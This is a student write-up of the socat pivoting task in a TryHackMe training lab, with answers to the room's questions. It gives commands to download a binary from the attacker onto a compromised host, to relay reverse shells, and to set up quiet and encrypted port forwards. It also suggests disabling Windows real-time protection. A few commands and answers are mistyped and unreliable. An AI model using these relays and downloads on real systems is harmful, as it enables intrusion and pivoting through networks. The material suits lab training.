**Task 13: Socat**

Socat is basically a command line based utility that establishes two bidirectional byte streams and transfers data between them.\

For installing this in windows you have to turn of the real time real time protection mode...

Socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. 
This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

![image](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/81ffbef2-13a0-488f-b119-7020e73300f9)

Socat can be think of as a portal between two networks, like in apex wraiths ult uses portal and connects the two areas, it doesnt get affected
from the fact wether portals are between two different machines or in the same machine

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward.

Well in my experience if you want to this thing more safely use metasploit, it like a combo tool much better then socat.

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

For example, with a Python webserver:-

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`
after executing this command you will see something like this on the terminal

![socat1](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/5494696a-8b61-462f-ac92-8bb5e8745ceb)

Then execute the following command:

    curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME

![socat2](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/c80b5b4f-a01d-4169-9ebe-de1a99451d87)

Lets move forward with Reverse Shell Relay..

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). 

Like we did in **TASK 7**, by connecting the root machine we collected the private key with the file name id_rsa..

Lets do that again..

1. Start a netcat netcat listener on our attacking box by :

        sudo nc -lvnp 443

2. On the compromised server, use the following command to start the relay:

        ./task13 tcp-l:8000 tcp:ATTACKING_IP:443 &

 By using these commands we can do a reverse shell connection with the target machine...

Now lets see the other topic:

- **Port forwading easy :**

The quick and fast method for creating a port forwader using the socat is quite simple by just opening a port that can listen
to the requests in the compromised server..

The command for doing so is:

    ./socat tcp-l:90,fork,reuseaddr tcp:10.200.57.200:3306 &

This is the command for compromised server i.e 10.200.57.200 and the target is port 3306 of 10.200.57.20..

- **Port Forwarding -- Quiet**

  In similar way we can do quiet like without informaing the target server that we doing a connection on to it

  First of all, on our own attacking machine, we issue the following command:

      socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
    
    ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:

    ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

for more just go through the task filee..

**Q.  Which socat option allows you to reuse the same listening port for more than one connection?**

Ans: Its preset in the question only,  'resue' port, thats bascially address so  `resueaddr` is the ans.

**Q. If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?
Use TCP port 8000 for the server listener, and do not background the process.**

Ans: ./socat tcp-l:8000 tcp:172.16.0.200:443

**Q. What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**

Ans: `./socat tcp-l:2222,fork,reuseaddr tcp:127.16.0.100:22`

**Q. Bonus Question (Optional): Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this(well dont have money for shell room :)).**

Ans: lets try to solve this using `man` command and see what are the options available for OPENSSL connections

![Screenshot_2023-08-04_03_58_11](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/baead344-3bec-4f85-87ec-6a4b4a8eb910)

  The command will look something like this

Chatgpt for the win lol

# Step 1: Generate SSL certificate and private key
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Step 2: Start the SSL server (destination server)
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=certificate.pem,key=key.pem TCP4:destination_server_ip:destination_server_port &

# Step 3: Start the SSL client (source server)
socat TCP4-LISTEN:local_port,reuseaddr,fork OPENSSL:destination_server_ip:443,cafile=certificate.pem &

# Step 4: Test the encrypted port forward
echo "Hello, World!" | socat - TCP4:localhost:local_port
  
